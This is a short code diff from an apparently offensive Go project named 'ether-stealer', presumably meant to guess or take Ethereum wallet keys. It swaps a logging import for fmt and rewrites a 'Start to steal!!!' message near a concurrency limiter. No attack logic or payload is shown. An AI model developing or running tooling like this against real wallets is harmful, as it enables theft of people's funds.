@@ -2,10 +2,10 @@ package main
 
 import (
 	"flag"
+	"fmt"
 	"net"
 
 	"github.com/hexoul/ether-stealer/crypto"
-	"github.com/hexoul/ether-stealer/log"
 	"github.com/hexoul/ether-stealer/steal"
 
 	"github.com/korovkin/limiter"
@@ -34,7 +34,7 @@ func main() {
 
 	flag.Parse()
 	stealer := steal.New()
-	log.Infof("Steal start!!! from <%s> by <%s>", ip, *identifier)
+	fmt.Printf("Start to steal!!! from <%s> by <%s>\n", ip, *identifier)
 
 	limit := limiter.NewConcurrencyLimiter(*nLimit)
 	// If you want finite iterator,
